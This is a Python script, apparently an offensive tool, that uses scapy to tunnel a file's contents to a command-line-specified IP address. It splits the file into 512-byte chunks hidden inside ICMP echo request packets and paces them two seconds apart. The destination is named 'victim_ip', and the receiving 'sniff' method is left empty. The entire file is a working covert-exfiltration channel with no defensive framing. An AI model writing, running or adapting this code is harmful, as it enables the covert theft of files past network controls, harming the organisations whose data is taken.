from scapy.all import ICMP, IP, send

import os
import sys
import threading
import time

MAX = 512


class ICMPTunneler:
    def __init__(self, victim_ip: str, file_path: str) -> None:
        self.victim_ip = victim_ip
        self.file_path = file_path

    def send(self):
        ip = IP(dst=self.victim_ip)
        icmp = ICMP(type=8, code=0)

        buffer = b""

        with open(self.file_path, "rb") as file:
            file_size = os.path.getsize(self.file_path)
            
            i = 1

            while file_size > 0:
                try:
                    buffer = file.read(MAX)
                    file_size -= MAX

                    packet = ip / icmp / buffer
                    send(packet, verbose=False)

                    print(f"[*] Packet {i} sent. {file_size} bytes remaining ...")
                    i += 1

                    time.sleep(2)
                except KeyboardInterrupt:
                    print("Keyboard interruption. Quiting ...")
                    sys.exit()

    def sniff(self):
        pass

    def run(self, must_sniff: bool = False):
        self.send_thread = threading.Thread(target=self.send)
        self.send_thread.start()

        if must_sniff:
            self.sniff_thread = threading.Thread(target=self.sniff)
            self.sniff_thread.start()


def main():
    victim_ip = sys.argv[1]
    file_path = sys.argv[2]

    icmp_tunneler = ICMPTunneler(victim_ip, file_path)
    icmp_tunneler.run()


if __name__ == "__main__":
    main()
